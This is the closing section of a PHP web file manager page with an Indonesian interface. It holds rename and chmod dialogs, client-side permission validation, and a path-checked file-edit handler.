        <div id="renameModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Rename</h2>
                    <button class="modal-close" onclick="hideModal('renameModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="newName">Nama Baru</label>
                            <input type="text" id="newName" name="new_name" class="form-control" required>
                            <small class="text-muted">Masukkan nama baru untuk file/folder</small>
                        </div>
                        <input type="hidden" id="renameTarget" name="target">
                        <input type="hidden" name="rename" value="1">
                        <button type="submit" class="btn btn-block">Rename</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modal untuk CHMOD - Diperbarui -->
        <div id="chmodModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Ubah Permission (CHMOD)</h2>
                    <button class="modal-close" onclick="hideModal('chmodModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="permission">Permission (contoh: 0644)</label>
                            <input type="text" id="permission" name="mode" class="form-control" required>
                            <small class="text-muted">Format: 3-4 digit angka octal (misal: 0755, 644)</small>
                        </div>
                        <input type="hidden" id="chmodTarget" name="target">
                        <input type="hidden" name="action" value="chmod">
                        <button type="submit" class="btn btn-block">Ubah</button>
                    </form>
                </div>
            </div>
        </div>
        
        <script>
            // Fungsi untuk menampilkan modal
            function showModal(id) {
                document.getElementById(id).classList.add('active');
                document.body.style.overflow = 'hidden';
            }
            
            // Fungsi untuk menyembunyikan modal
            function hideModal(id) {
                document.getElementById(id).classList.remove('active');
                document.body.style.overflow = '';
            }
            
            // Fungsi untuk edit file
            function editFile(filename) {
                fetch('?path=<?= urlencode($currentPath) ?>&edit=' + encodeURIComponent(filename))
                    .then(response => {
                        if (!response.ok) throw new Error('Gagal memuat file');
                        return response.text();
                    })
                    .then(data => {
                        document.getElementById('fileContent').value = data;
                        document.getElementById('editFileName').value = filename;
                        showModal('editModal');
                    })
                    .catch(error => {
                        alert('Error: ' + error.message);
                    });
            }
            
            // Fungsi untuk menampilkan rename modal
            function showRename(name = '') {
                if (name) {
                    document.getElementById('newName').value = name;
                    document.getElementById('renameTarget').value = name;
                    showModal('renameModal');
                } else {
                    alert('Pilih file atau folder yang ingin direname');
                }
            }
            
            // Fungsi untuk menampilkan chmod modal
            function showChmod(name = '', currentPerms = '') {
                if (name) {
                    document.getElementById('permission').value = currentPerms;
                    document.getElementById('chmodTarget').value = name;
                    showModal('chmodModal');
                } else {
                    alert('Pilih file atau folder yang ingin diubah permissionnya');
                }
            }
            
            // Toggle sidebar di mobile
            function toggleSidebar() {
                document.querySelector('.sidebar').classList.toggle('active');
            }
            
            // Tangani klik di luar modal untuk menutup
            window.onclick = function(event) {
                document.querySelectorAll('.modal').forEach(modal => {
                    if (event.target === modal) {
                        hideModal(modal.id);
                    }
                });
            }
            
            // Tangani pengeditan file
            <?php if (isset($_GET['edit'])): ?>
                <?php
                $file = $_GET['edit'];
                $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
                
                if (file_exists($filePath) && is_file($filePath) && isSafePath($filePath, $rootPath, $specialDirectories) && 
                    in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), $editableExtensions)) {
                    $content = @file_get_contents($filePath);
                } else {
                    $content = '';
                }
                ?>
                document.addEventListener('DOMContentLoaded', function() {
                    document.getElementById('fileContent').value = <?= json_encode($content) ?>;
                    document.getElementById('editFileName').value = <?= json_encode($file) ?>;
                    showModal('editModal');
                });
            <?php endif; ?>
            
            // Fungsi untuk validasi CHMOD
            document.getElementById('chmodModal')?.querySelector('form').addEventListener('submit', function(e) {
                const permission = document.getElementById('permission').value;
                if (!/^[0-7]{3,4}$/.test(permission)) {
                    e.preventDefault();
                    alert('Format permission tidak valid. Gunakan 3-4 digit angka octal (misal: 0644 atau 755)');
                }
            });
        </script>
    <?php endif; ?>
</body>
</html>
